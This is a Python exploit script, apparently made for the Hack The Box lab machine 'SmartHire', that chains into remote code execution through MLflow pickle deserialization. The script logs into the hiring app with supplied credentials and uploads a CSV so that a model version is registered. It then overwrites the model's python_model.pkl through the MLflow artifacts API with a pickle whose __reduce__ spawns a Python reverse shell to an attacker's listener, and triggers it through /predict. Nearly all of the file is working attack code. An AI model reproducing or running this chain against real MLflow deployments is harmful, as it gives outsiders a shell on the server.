#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║       SmartHire - MLflow Pickle Deserialization RCE  ║
║                                                      ║
║       Author  : maverick-vf142                       ║
║       HTB     : SmartHire                            ║
║       CVE     : Pickle Deserialization via MLflow    ║
╚══════════════════════════════════════════════════════╝

Usage: python3 exploit.py <LHOST> <LPORT> [--target <URL>] [--mlflow <URL>]

All credentials and targets are prompted or passed as args — nothing hardcoded.
"""

import pickle
import os
import sys
import argparse
import getpass
import requests

# ── Argument parsing ──────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="SmartHire MLflow RCE")
parser.add_argument("lhost",   help="Your listener IP")
parser.add_argument("lport",   help="Your listener port")
parser.add_argument("--target", default="http://smarthire.htb",        help="Target app URL")
parser.add_argument("--mlflow", default="http://models.smarthire.htb", help="MLflow URL")
args = parser.parse_args()

LHOST  = args.lhost
LPORT  = args.lport
TARGET = args.target.rstrip("/")
MLFLOW = args.mlflow.rstrip("/")

TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"

print("╔══════════════════════════════════════════════════════╗")
print("║     SmartHire - MLflow Pickle Deserialization RCE    ║")
print("║                  by maverick-vf142                   ║")
print("╚══════════════════════════════════════════════════════╝")
print(f"[*] Target  : {TARGET}")
print(f"[*] MLflow  : {MLFLOW}")
print(f"[*] Listener: {LHOST}:{LPORT}")
print()

# ── App credentials ───────────────────────────────────────────────────────────
print("[*] App credentials (needs upload/admin role):")
app_user = input("    Username : ")
app_pass = getpass.getpass("    Password : ")

# ── MLflow credentials ────────────────────────────────────────────────────────
print("\n[*] MLflow credentials (press Enter to use defaults admin/password):")
ml_user  = input("    MLflow username [admin]   : ").strip() or "admin"
ml_pass  = getpass.getpass("    MLflow password [password]: ") or "password"
MLCREDS  = (ml_user, ml_pass)
print()

# ── Pickle payload ────────────────────────────────────────────────────────────
class ReverseShell:
    def __reduce__(self):
        cmd = (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
print(f"[+] Pickle payload built ({len(payload)} bytes)")

# ── Login ─────────────────────────────────────────────────────────────────────
print(f"[*] Logging in as '{app_user}'...")
sess = requests.Session()
r = sess.post(f"{TARGET}/login",
              data={"username": app_user, "password": app_pass},
              allow_redirects=True)

if "dashboard" not in r.url:
    print(f"[!] Login failed — landed at: {r.url}")
    print(f"    HTTP {r.status_code} | Check credentials or --target")
    sys.exit(1)
print(f"[+] Login OK — session active")

# ── Upload training CSV ───────────────────────────────────────────────────────
print("[*] Uploading training CSV to register a new MLflow model version...")
r = sess.post(f"{TARGET}/upload_hiring_data",
              files={"file": ("train.csv", TRAIN_CSV, "text/csv")})

if "login" in r.url:
    print("[!] Redirected to login — this account lacks upload/admin permissions")
    sys.exit(1)

if r.status_code != 200:
    print(f"[!] Upload failed: HTTP {r.status_code} | {r.text[:300]}")
    sys.exit(1)

try:
    version = r.json().get("model_info", {}).get("version", "?")
except requests.exceptions.JSONDecodeError:
    print(f"[!] Non-JSON response from /upload_hiring_data:")
    print(f"    {r.text[:400]}")
    sys.exit(1)

print(f"[+] Registered model version: {version}")

# ── Grab latest run_id from MLflow ────────────────────────────────────────────
print("[*] Fetching latest run_id from MLflow API...")
r = requests.post(
    f"{MLFLOW}/api/2.0/mlflow/runs/search",
    json={"experiment_ids": ["0"], "max_results": 1},
    auth=MLCREDS
)

if r.status_code == 401:
    print("[!] MLflow auth failed — wrong MLflow credentials")
    sys.exit(1)

try:
    run_id = r.json()["runs"][0]["info"]["run_id"]
except (KeyError, IndexError):
    print(f"[!] Could not parse run_id:\n    {r.text[:300]}")
    sys.exit(1)

print(f"[+] run_id: {run_id}")

# ── Overwrite python_model.pkl ────────────────────────────────────────────────
print("[*] Replacing python_model.pkl with malicious pickle...")
artifact_url = (
    f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts"
    f"/0/{run_id}/artifacts/model/python_model.pkl"
)
r = requests.put(artifact_url, data=payload, auth=MLCREDS,
                 headers={"Content-Type": "application/octet-stream"})

if r.status_code != 200:
    print(f"[!] Artifact upload failed: HTTP {r.status_code} | {r.text[:300]}")
    sys.exit(1)

print(f"[+] Malicious pickle uploaded successfully")

# ── Trigger /predict → executes pickle → reverse shell ───────────────────────
print(f"\n[!] Start your listener now:  nc -lvnp {LPORT}")
input("[*] Press Enter when your listener is ready...")

print(f"[*] Triggering /predict ...")
try:
    sess.post(f"{TARGET}/predict",
              files={"file": ("pred.csv", PRED_CSV, "text/csv")},
              timeout=20)
except requests.exceptions.Timeout:
    pass  # expected — shell holds the connection open

print("[+] Done — check your listener for a shell.")
print("    If nothing arrived, the box may block outbound TCP.")
